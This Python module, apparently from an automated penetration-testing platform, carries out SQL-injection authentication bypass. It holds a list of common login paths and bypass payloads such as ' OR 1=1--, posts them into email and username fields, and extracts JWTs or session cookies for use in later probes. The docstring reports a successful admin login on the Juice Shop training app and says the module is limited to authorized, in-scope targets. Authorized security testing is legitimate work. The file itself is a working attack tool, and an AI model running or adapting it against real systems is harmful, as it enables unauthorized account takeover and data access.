"""
core/wraith/capability.py

Phase 4 — capability-based escalation.

The self-directing hunt (chain_hunter) converges when a follow-on needs auth it
doesn't have: a proven SQLi unlocks IDOR, but IDOR needs a session. This module
closes that wall — it PERFORMS a verified auth-bypass exploit to *acquire the
capability* (a session/token), which the hunt then threads into its probes so the
auth-gated follow-ons can confirm and the hunt deepens.

Concretely, the most common acquirable capability is a SQL-injection auth bypass
on a login endpoint: `email=' OR 1=1--` returns a JWT (live-proven on Juice Shop:
logs in as admin@juice-sh.op; that token flips /rest/basket/N from 401 to 200).

This is real exploitation, so callers MUST gate it: active mode only, scope-
checked, on an authorized target. The acquirer is bounded (capped attempts) and
best-effort (returns None, never raises). `send` is injectable for tests.
"""

from __future__ import annotations

import json
import logging
import re
from typing import Any, Awaitable, Callable, Dict, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# Common login endpoints across stacks.
LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/signin", "/api/sessions", "/user/login", "/users/login",
    "/account/login",
]
# Auth-bypass boundary payloads (the boundary must break the WHERE clause).
SQLI_BYPASS = [
    "' OR 1=1--", "' OR '1'='1'-- -", "admin' OR '1'='1'-- -",
    "' OR 1=1#", "') OR ('1'='1'-- -",
]
# Credential field names to inject into.
_CRED_FIELDS = ["email", "username"]

# (url, json_body) -> (status, headers, body_text). Async; injectable for tests.
Send = Callable[[str, Dict[str, Any]], Awaitable[Tuple[int, Dict[str, str], str]]]


def _extract_token(headers: Dict[str, str], body: str) -> Optional[str]:
    """Pull a usable auth token out of a login response (pure).

    Looks for a JWT-ish string in common JSON shapes, then a Set-Cookie session.
    Returns None when nothing usable is present.
    """
    # 1. JSON body — the common shapes (Juice Shop: authentication.token).
    try:
        d = json.loads(body)
    except Exception:
        d = None
    if isinstance(d, dict):
        for path in (
            ("authentication", "token"), ("token",), ("accessToken",),
            ("access_token",), ("jwt",), ("data", "token"), ("data", "accessToken"),
        ):
            cur: Any = d
            for k in path:
                cur = cur.get(k) if isinstance(cur, dict) else None
                if cur is None:
                    break
            if isinstance(cur, str) and len(cur) >= 20:
                return cur
    return None


def _extract_cookie(headers: Dict[str, str]) -> Optional[str]:
    """A session cookie from Set-Cookie, if the body had no token."""
    sc = ""
    for k, v in (headers or {}).items():
        if k.lower() == "set-cookie":
            sc = v
            break
    m = re.search(r"((?:token|session|jwt|sid|connect\.sid|auth)=[^;]+)", sc, re.IGNORECASE)
    if m and len(m.group(1)) >= 14:
        return m.group(1)
    return None


async def acquire_auth_via_login_sqli(
    target: str,
    scope_filter: Optional[Callable[[str], bool]] = None,
    *,
    timeout: float = 10.0,
    max_attempts: int = 30,
    send: Optional[Send] = None,
) -> Optional[Dict[str, Any]]:
    """Try to obtain a session by SQL-injecting a login endpoint.

    Returns a capability dict ``{"headers", "cookies", "provenance", "token"}`` on
    success, else None. Bounded by `max_attempts`; stops on first success. Honors
    `scope_filter` (fail-closed). Never raises.
    """
    parsed = urlparse(target if "://" in target else "http://" + target)
    if not parsed.netloc:
        return None
    origin = f"{parsed.scheme}://{parsed.netloc}"
    sender = send or _default_send(timeout)

    attempts = 0
    for path in LOGIN_PATHS:
        url = origin + path
        if scope_filter is not None:
            try:
                if not scope_filter(url):
                    continue
            except Exception:
                continue
        for payload in SQLI_BYPASS:
            for field in _CRED_FIELDS:
                if attempts >= max_attempts:
                    return None
                attempts += 1
                try:
                    status, headers, body = await sender(url, {field: payload, "password": "x"})
                except Exception:
                    continue
                if status >= 500 or status == 404:
                    # 404 → wrong path (skip its remaining payloads); 5xx → error.
                    if status == 404:
                        break
                    continue
                token = _extract_token(headers, body)
                if token:
                    logger.info("[capability] SQLi auth bypass at %s (%s)", path, field)
                    return {
                        "headers": {"Authorization": f"Bearer {token}"},
                        "cookies": {},
                        "provenance": f"SQLi auth bypass: {field}={payload!r} @ {path}",
                        "token": token,
                    }
                cookie = _extract_cookie(headers)
                if cookie:
                    name, _, value = cookie.partition("=")
                    logger.info("[capability] SQLi auth bypass (cookie) at %s", path)
                    return {
                        "headers": {},
                        "cookies": {name: value},
                        "provenance": f"SQLi auth bypass (cookie) @ {path}",
                        "token": None,
                    }
            else:
                continue
            break  # inner break (404) → next path
    return None


def _default_send(timeout: float) -> Send:
    async def _send(url: str, body: Dict[str, Any]) -> Tuple[int, Dict[str, str], str]:
        import httpx
        headers = {"Content-Type": "application/json",
                   "User-Agent": "SentinelForge-Capability"}
        # Carry the bug-bounty deconfliction header like the rest of the platform.
        import os
        _bb = os.getenv("SENTINEL_GHOST_BB_VALUE", "").strip()
        if _bb:
            headers[os.getenv("SENTINEL_GHOST_BB_HEADER", "X-Bug-Bounty").strip()] = _bb
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as c:
            r = await c.post(url, json=body, headers=headers)
            return r.status_code, {k: v for k, v in r.headers.items()}, r.text
    return _send
